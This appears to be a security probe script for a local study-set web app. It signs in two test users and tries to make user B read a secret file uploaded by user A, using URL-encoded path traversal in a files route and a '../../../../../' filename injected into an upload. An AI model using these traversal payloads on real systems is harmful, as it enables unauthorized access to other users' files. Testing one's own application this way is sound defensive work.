const BASE="http://localhost:3001";
const [emailA, emailB] = process.argv.slice(2);
class C{constructor(){this.j=new Map()}ck(){return[...this.j].map(([k,v])=>`${k}=${v}`).join("; ")}st(r){for(const c of r.headers.getSetCookie()){const[kv]=c.split(";");const i=kv.indexOf("=");this.j.set(kv.slice(0,i),kv.slice(i+1))}}
async req(p,o={}){const h={...(o.headers||{}),cookie:this.ck()};let body=o.body;if(o.json!==undefined){h["content-type"]="application/json";body=JSON.stringify(o.json)}const r=await fetch(BASE+p,{method:o.method||"GET",headers:h,body,redirect:"manual"});this.st(r);const t=await r.text();let d;try{d=JSON.parse(t)}catch{d=t}return{status:r.status,data:d}}
async signIn(e,p){const c=await this.req("/api/auth/csrf");await this.req("/api/auth/callback/credentials",{method:"POST",body:new URLSearchParams({csrfToken:c.data.csrfToken,email:e,password:p,json:"true"}).toString(),headers:{"content-type":"application/x-www-form-urlencoded"}});return (await this.req("/api/auth/session")).data?.user?.id}}
const A=new C(),B=new C();await A.signIn(emailA,"probe-password-123");await B.signIn(emailB,"probe-password-123");
const SECRET="TOP-SECRET-A-"+Date.now()+" backpropagation gradient chain rule learning rate momentum ".repeat(5);
const a=await A.req("/api/study-sets",{method:"POST",json:{title:"A secret set",sources:[{kind:"file",filename:"secret.txt",mimeType:"text/plain",sizeBytes:SECRET.length}]}});
const s=a.data.sources[0];const u=new URL(s.upload.uploadUrl);await A.req(u.pathname+u.search,{method:"PUT",body:SECRET,headers:{"content-type":"text/plain"}});
const wsA=a.data.studySet.workspaceId;
const bl=(await B.req("/api/study-sets")).data; const setB=bl.find(x=>x.title==="Probe B set");
const bset=(await B.req(`/api/study-sets/${setB.id}`)).data.studySet;
// files traversal read
const tr=await B.req(`/api/files/workspaces/${bset.workspaceId}/..%2F${wsA}/study-sets/${a.data.studySet.id}/sources/${s.id}/secret.txt`);
console.log("files traversal:",tr.status, String(tr.data).includes("TOP-SECRET-A")?"LEAKED A's file":String(tr.data).slice(0,60));
// filename traversal with 5 levels
const name=`../../../../../${wsA}/study-sets/${a.data.studySet.id}/sources/${s.id}/secret.txt`;
const src=await B.req(`/api/study-sets/${setB.id}/sources`,{method:"POST",json:{kind:"file",filename:name,mimeType:"text/plain",sizeBytes:10}});
const comp=await B.req("/api/uploads/complete",{method:"POST",json:{sourceId:src.data.source.id}});
await new Promise(r=>setTimeout(r,8000));
const det=(await B.req(`/api/account/export`)).data;
console.log("filename traversal: complete",comp.status, JSON.stringify(det).includes("TOP-SECRET-A")?"LEAKED A's file into B's study set":"no leak");
// youtube playback
const srcs=(await B.req(`/api/study-sets/${setB.id}/sources`)).data.sources; const yt=srcs.find(x=>x.type==="YOUTUBE"&&x.status==="READY");
if(yt){const d=(await B.req(`/api/study-sets/${setB.id}/sources/${yt.id}`)).data.source; const u=new URL(d.playbackUrl); const r=await fetch(u,{headers:{cookie:B.ck()}}); console.log("youtube playback url",u.pathname,"->",r.status);}
